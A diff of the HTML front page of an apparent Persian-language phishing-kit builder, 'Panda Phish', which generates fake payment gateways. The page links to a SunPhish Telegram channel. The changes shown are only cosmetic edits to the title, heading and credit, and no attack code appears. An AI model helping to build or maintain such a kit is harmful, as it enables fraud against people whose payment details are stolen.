@@ -7,7 +7,7 @@
 	        <!----- CREATED BY fuckingdargah ----->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درگاه ساز پاندافیش</title>
+    <title>درگاه ساز پاندا فیش</title>
     <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
     <link rel="stylesheet" type="text/css" href="css/fontawesome-all.min.css">
     <link rel="stylesheet" type="text/css" href="css/iofrm-style.css">
@@ -26,7 +26,7 @@
             <div class="form-holder">
                 <div class="form-content">
                     <div class="form-items">
-                        <h3>درگاه ساز پاندافیش</h3>
+                        <h3>درگاه ساز پاندا فیش</h3>
                         <p>جهت ساخت درگاه فیلد های زیر را تکمیل کنید!<p>
                         
                         <form method="POST" action="Code.php" onSubmit="return javidh();">
@@ -39,7 +39,7 @@
                             </div>
                         </form>
                         <div class="other-links">
-                    <a href="../../https://t.me/SunPhish"><font color="#00ffff">CODED BY MR BOOM </font></a>
+                    <a href="../../https://t.me/SunPhish"><font color="#00ffff">CODED BY Mr BooM </font></a>
     </div>
                         </form>
                         <div class="other-links">
